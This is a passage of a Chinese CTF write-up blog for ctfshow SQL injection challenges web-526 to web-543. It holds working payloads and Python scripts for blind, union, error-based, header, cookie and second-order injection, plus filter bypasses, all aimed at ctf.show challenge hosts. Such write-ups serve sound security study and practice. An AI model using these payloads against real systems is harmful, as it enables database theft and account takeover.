information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            stime=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>            r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()-stime&lt;<span class="hljs-number">1</span>:<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            <span class="hljs-built_in">result</span> += chr(low)<br>        <span class="hljs-keyword">else</span>:<br>            break<br>        print(<span class="hljs-built_in">result</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="web-526-时间盲注id-1”"><a href="#web-526-时间盲注id-1”" class="headerlink" title="web-526 时间盲注id&#x3D;1”"></a>web-526 时间盲注id&#x3D;1”</h2><p>同样是时间盲注，就是换成了双引号闭合</p><hr><h2 id="web-527-POST字符型注入username-1’"><a href="#web-527-POST字符型注入username-1’" class="headerlink" title="web-527 POST字符型注入username&#x3D;1’"></a>web-527 POST字符型注入username&#x3D;1’</h2><p>这里就到了POST注入了。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp">在username输入框中注入，也可以抓包在请求头中注入<br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name)<span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctfshow&#x27;</span><span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name)<span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flagugsd&#x27;</span><span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flag43s) <span class="hljs-keyword">from</span> ctfshow.flagugsd<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-528-POST字符型注入username-1”"><a href="#web-528-POST字符型注入username-1”" class="headerlink" title="web-528 POST字符型注入username&#x3D;1”)"></a>web-528 POST字符型注入username&#x3D;1”)</h2><p>前面的步骤都一样，只是换成了”)注入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>&quot;) union <span class="hljs-selector-tag">select</span> <span class="hljs-number">1</span>,group_concat(flag43as) <span class="hljs-selector-tag">from</span> ctfshow<span class="hljs-selector-class">.flagugsds</span>#<br></code></pre></td></tr></table></figure><hr><h2 id="web-529-报错注入username-1’"><a href="#web-529-报错注入username-1’" class="headerlink" title="web-529 报错注入username&#x3D;1’)"></a>web-529 报错注入username&#x3D;1’)</h2><p>闭合错误时有语句错误回显，所以可以使用报错注入。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))#</span><br><span class="hljs-string"></span><br><span class="hljs-string">admin&#x27;</span>) <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(flag4) <span class="hljs-keyword">from</span> ctfshow.flag),<span class="hljs-number">0x7e</span>))#<br><br><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;) and extractvalue(1,concat(0x7e,(select right(group_concat(flag4),20) from ctfshow.flag),0x7e))#</span><br><span class="hljs-string"></span><br><span class="hljs-string">报错注入用or也可以，而且可以用()来绕过空格过滤</span><br><span class="hljs-string">例如：</span><br><span class="hljs-string">admin&#x27;</span>)<span class="hljs-keyword">or</span>(extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">0x7e</span>)))#<br></code></pre></td></tr></table></figure><hr><h2 id="web-530-报错注入usrename-1”、布尔盲注"><a href="#web-530-报错注入usrename-1”、布尔盲注" class="headerlink" title="web-530 报错注入usrename&#x3D;1”、布尔盲注"></a>web-530 报错注入usrename&#x3D;1”、布尔盲注</h2><p>同样是报错注入，只是换成了”闭合，这题和上题都可以使用POST布尔盲注</p><p>POST布尔盲注脚本</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span><br>url=<span class="hljs-string">&quot;https://5bb66a59-8c81-497d-99f9-339726c2ffa1.challenge.ctf.show/&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">127</span><br>    i=i+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> low&lt;high:<br>        <span class="hljs-built_in">mid</span>=(low+high) <span class="hljs-comment">// 2</span><br>        data=&#123;<br>            <span class="hljs-string">&#x27;uname&#x27;</span>:f<span class="hljs-string">&#x27;admin&quot; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>        &#125;<br>        response=requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> response.<span class="hljs-built_in">text</span>.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;flag.jpg&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            low=<span class="hljs-built_in">mid</span>+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high=<span class="hljs-built_in">mid</span><br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>        flag+=chr(low)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(flag)<br><br></code></pre></td></tr></table></figure><hr><h2 id="web-531-报错注入username-admin’"><a href="#web-531-报错注入username-admin’" class="headerlink" title="web-531 报错注入username&#x3D;admin’"></a>web-531 报错注入username&#x3D;admin’</h2><p>‘闭合，其他如上</p><hr><h2 id="web-532-报错注入username-admin”"><a href="#web-532-报错注入username-admin”" class="headerlink" title="web-532 报错注入username&#x3D;admin”)"></a>web-532 报错注入username&#x3D;admin”)</h2><p>“)闭合，其他如上</p><hr><h2 id="web-533-报错注入password-1’"><a href="#web-533-报错注入password-1’" class="headerlink" title="web-533 报错注入password&#x3D;1’"></a>web-533 报错注入password&#x3D;1’</h2><p>在密码行进行报错注入</p><p>判断闭合:</p><p>无论密码如何设置都会显示成功所以只有当你成功闭合后面写上错误语句时才会报错否则不会报错</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select (table_name) from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br><br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select (column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br><br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select (flag4) from ctfshow.flag),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select right(flag4,<span class="hljs-number">20</span>) from ctfshow.flag),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><h2 id="web-534-ua头注入"><a href="#web-534-ua头注入" class="headerlink" title="web-534 ua头注入"></a>web-534 ua头注入</h2><p>首先需要登录成功。</p><p>name：admin</p><p>password：admin</p><p>发现登录成功后会回显ua头</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nsis">所以ua头注入<br><br>用hackbar<br><br>添加ua头先法送一次再用<span class="hljs-literal">admin</span> <span class="hljs-literal">admin</span> 登录你的ua头才是你自己定义的<br><br>或者是直接在bp上搞<br><br><span class="hljs-literal">User</span>-Agent: <span class="hljs-string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(flag4)from ctfshow.flag),0x7e),1)or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; =&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>也可以使用python脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>payload = <span class="hljs-string">&#x27;group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;&#x27;</span>;<br><span class="hljs-comment"># payload = &#x27;group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;&#x27;;</span><br><span class="hljs-comment"># payload = &#x27;group_concat(flag4) from ctfshow.flag&#x27;;</span><br><span class="hljs-comment">#payload = &#x27;right(flag4,20) from ctfshow.flag&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:f<span class="hljs-string">&quot;&#x27;and extractvalue(1,concat(0x7e,(select &#123;payload&#125;),0x7e)) and &#x27;1&#x27;=&#x27;1&quot;</span>,<br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/&#x27;</span><br>r = requests.post(url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(r.text)<br><br></code></pre></td></tr></table></figure><hr><h2 id="web-535-referer注入"><a href="#web-535-referer注入" class="headerlink" title="web-535 referer注入"></a>web-535 referer注入</h2><p>首先需要登录成功。</p><p>name：admin</p><p>password：admin</p><p>然后发现登录成功的界面会回显referer头信息</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">所以这里可以使用<span class="hljs-keyword">referer</span>注入<br><br>在hackbar或者bp抓包中测试闭合<br><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>假如说闭合错误的话会有报错<br><br><span class="hljs-string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(flag4)from ctfshow.flag),0x7e),1)or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; =&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>同样可以使用python脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>payload = <span class="hljs-string">&#x27;group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;&#x27;</span>;<br><span class="hljs-comment"># payload = &#x27;group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;&#x27;;</span><br><span class="hljs-comment"># payload = &#x27;group_concat(flag4) from ctfshow.flag&#x27;;</span><br><span class="hljs-comment">#payload = &#x27;right(flag4,20) from ctfshow.flag&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Referer&quot;</span>:f<span class="hljs-string">&quot;&#x27;and extractvalue(1,concat(0x7e,(select &#123;payload&#125;),0x7e)) and &#x27;1&#x27;=&#x27;1&quot;</span>,<br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/&#x27;</span><br>r = requests.post(url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><hr><h2 id="web-536-cookie注入、uname-admin’"><a href="#web-536-cookie注入、uname-admin’" class="headerlink" title="web-536 cookie注入、uname&#x3D;admin’"></a>web-536 cookie注入、uname&#x3D;admin’</h2><p>首先需要登录成功。</p><p>name：admin</p><p>password：admin</p><p>然后登录成功后发现会回显cookie信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">先登录然后抓包，或者hackbar修改cookie<br>在<span class="hljs-attribute">uname</span>=admin后添加payload<br><br>Cookie：<span class="hljs-attribute">uname</span>=admin&#x27;or updatexml(1,concat(0x7e,(select group_concat(flag4)<span class="hljs-keyword">from</span> ctfshow.flag),0x7e),32)<span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&#x27;</span> =<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure><p>python脚本也行。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>payload = <span class="hljs-string">&#x27;group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;&#x27;</span>;<br><span class="hljs-comment"># payload = &#x27;group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;&#x27;;</span><br><span class="hljs-comment"># payload = &#x27;group_concat(flag4) from ctfshow.flag&#x27;;</span><br><span class="hljs-comment">#payload = &#x27;right(flag4,20) from ctfshow.flag&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:f<span class="hljs-string">&quot;uname=admin&#x27;or extractvalue(1,concat(0x7e,(select &#123;payload&#125;),0x7e)) and &#x27;1&#x27;=&#x27;1&quot;</span>,<br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/&#x27;</span><br>r = requests.post(url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><hr><h2 id="web-537-Cookie注入、base64加密、uname-’"><a href="#web-537-Cookie注入、base64加密、uname-’" class="headerlink" title="web-537 Cookie注入、base64加密、uname&#x3D;’)"></a>web-537 Cookie注入、base64加密、uname&#x3D;’)</h2><p>用简单命令先测试闭合方式</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">多了个base64<br><br>加密<br><br>进行加密即可<br>&#x27;) <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(flag4),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> ctfshow.flag <span class="hljs-comment">#</span><br><br>base64编码:<br>JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KGZsYWc0KSwzIGZyb20gY3Rmc2hvdy5mbGFnICM=<br></code></pre></td></tr></table></figure><hr><h2 id="web-538-uname-”"><a href="#web-538-uname-”" class="headerlink" title="web-538 uname&#x3D;”"></a>web-538 uname&#x3D;”</h2><p>其他和上一题一样，双引号”闭合</p><hr><h2 id="web-539-00注释符过滤绕过"><a href="#web-539-00注释符过滤绕过" class="headerlink" title="web-539 ;%00注释符过滤绕过"></a>web-539 ;%00注释符过滤绕过</h2><p>一:</p><p>可以看到后端对–+和#都进行了过滤，所以我们用url结束符： <strong>;%00</strong></p><p>二:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros">我们可以<br><br>•1. ?<span class="hljs-attribute">id</span>=1 返回正常<br><br>•2. ?<span class="hljs-attribute">id</span>=1&#x27; 返回异常，说明可能存在漏洞<br><br>•3. ?<span class="hljs-attribute">id</span>=1&#x27; --+ 或者?<span class="hljs-attribute">id</span>=1&#x27; # 均返回错误，通过源代码分析，我们得知--+ # 都被替换为了空格，这里使用 ;%00充当注释符<br><br>•4.?<span class="hljs-attribute">id</span>=1&#x27; order by 3 ;%00 查多少列<br><br>•5. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,3 ;%00 查找回显位置<br><br>•6. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata ;%00 查库名<br><br>•7. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema = 0x7365637572697479 ;%00 查表名<br><br>•8. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name = 0x7573657273 ;%00 查字段名<br><br>•9. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(concat_ws(0x7e,username,password)) <span class="hljs-keyword">from</span> security.users ;%00 查出字段中所有的值<br><br>也可以不用报错注入<br><br>但是前面的id应等与一个不纯在的数<br><br>也可以报错注入<br><br>?<span class="hljs-attribute">id</span>=1&#x27;and updatexml(1,concat(0x7e,right((select group_concat(flag4)<span class="hljs-keyword">from</span> ctfshow.flag),20),0x7e),1);%00<br>因为只能回显32个字符，所以使用right函数控制字符串回显<br></code></pre></td></tr></table></figure><hr><h2 id="web-540-二次注入"><a href="#web-540-二次注入" class="headerlink" title="web-540 二次注入"></a>web-540 二次注入</h2><p>当你创建一个admin’#的用户并登录后改变他的密码</p><p>回来登录发现admin的密码也被改变了</p><p>这样就可以确定SQL语句为 ‘ 闭合</p><p>若是未改变则不是 ‘ 闭合</p><p>原理：</p><p><strong>Sql 语句变为 UPDATE users SET passwd&#x3D;”New_Pass” WHERE username &#x3D;’</strong> </p><p><strong>admin’ # ‘ AND</strong></p><p><strong>password&#x3D;’ ， 也 就 是 执 行 了 UPDATE users SET passwd&#x3D;”New_Pass” WHERE username &#x3D;’</strong> </p><p><strong>admin’</strong> </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">创建一个admin&#x27;#用户，密码设为<span class="hljs-number">123456</span><br>然后修改密码<br>改为123，<br>然后我们就能登录admin用户了，密码被我们改成了123<br></code></pre></td></tr></table></figure><hr><h2 id="web-541-or、and双写绕过、id-1’"><a href="#web-541-or、and双写绕过、id-1’" class="headerlink" title="web-541 or、and双写绕过、id&#x3D;1’"></a>web-541 or、and双写绕过、id&#x3D;1’</h2><p>过滤了or和and可以使用双写绕过</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; aandnd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,right((select group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags),<span class="hljs-number">20</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>也可以使用||来代替and或or</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; || updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,right((select group_concat(flag4s)from ctfshow.flags),<span class="hljs-number">20</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><hr><h2 id="web-542-无列名注入-id-1、innodb"><a href="#web-542-无列名注入-id-1、innodb" class="headerlink" title="web-542 无列名注入 id&#x3D;1、innodb"></a>web-542 无列名注入 id&#x3D;1、innodb</h2><p><a href="https://blog.csdn.net/qq_66013948/article/details/136424994">SQL注入之 无列名注入 原理详解</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">默认数据库mysql查询+无列名注入<br><br>判断闭合方式。<br>?id=<span class="hljs-number">1</span> 正常回显<br><br>?id=<span class="hljs-number">1</span>%<span class="hljs-number">23</span> 正常回显<br><br>说明不需要闭合<br><br>注入方式尝试<br>先尝试下<span class="hljs-keyword">union</span>联合查询：<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>页面成功回显，说明存在联合查询注入点<br><br>绕过过滤<br>尝试获取数据库信息<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA),<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>页面回显报错，说明大概率存在过滤，过滤information_schema相关内容<br><br>这时使用默认的数据库mysql<br><br>获取所有数据库信息<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(database_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats),<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>获取数据库中数据表信息<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name=<span class="hljs-string">&#x27;ctfshow&#x27;</span>),<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>无列名注入获取flag<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-543-空格过滤绕过、or替换、-00sql结束符"><a href="#web-543-空格过滤绕过、or替换、-00sql结束符" class="headerlink" title="web-543 空格过滤绕过、or替换、;%00sql结束符"></a>web-543 空格过滤绕过、or替换、;%00sql结束符</h2><p>过滤了空格</p><p>对于空格，有较多的方法：</p><p>%09 TAB 键（水平）</p><p>%0a 新建一行%0a (后面的空格不能省)</p><p>%0c 新的一页</p><p>%0d return 功能</p><p>%0b TAB 键（垂直）</p><p>%a0 空格</p><p>但是都不行所以:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 